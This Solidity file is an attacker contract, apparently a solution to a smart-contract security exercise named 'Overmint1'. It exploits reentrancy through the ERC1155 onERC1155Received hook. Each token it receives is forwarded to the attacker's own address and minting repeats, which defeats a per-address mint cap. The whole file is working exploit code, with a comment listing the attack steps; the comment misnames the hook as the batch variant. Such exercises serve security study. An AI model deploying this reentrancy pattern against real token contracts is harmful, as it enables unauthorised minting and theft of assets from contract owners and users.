// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

import "contracts/Overmint1-ERC1155.sol";



contract Overmint1_ERC1155_Attacker is ERC1155Holder {


    Overmint1_ERC1155 victimContract;
    address attacker_eoa;

    constructor(address victimAddress ){
        victimContract =  Overmint1_ERC1155(victimAddress);
    } 

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public override returns (bytes4) {

        victimContract.safeTransferFrom(address(this),attacker_eoa,0,1,"Ox");

        while(victimContract.balanceOf(attacker_eoa, 0) < 5){
            victimContract.mint(0,"0x");
        }
        
        return this.onERC1155Received.selector;
    }


   /**
    1. make the attacker contract(Overmint1_ERC1155_Attacker) implement IERC1155Receiver-onERC1155BatchReceived
    2. while receive one type NFT(1),just sender to the attacker address in the onERC1155BatchReceived function.
    3. Because the victimContract judge the NFT amount based on the msg.sender, which actually is the Overmint1_ERC1155_Attacker, not the attacker EOA address.
    4. So just mint 4 times and transfer nft  4 times
   
    */
    function attack() external {

        attacker_eoa = msg.sender;
        victimContract.mint(0,"0x");
        
    }
    
}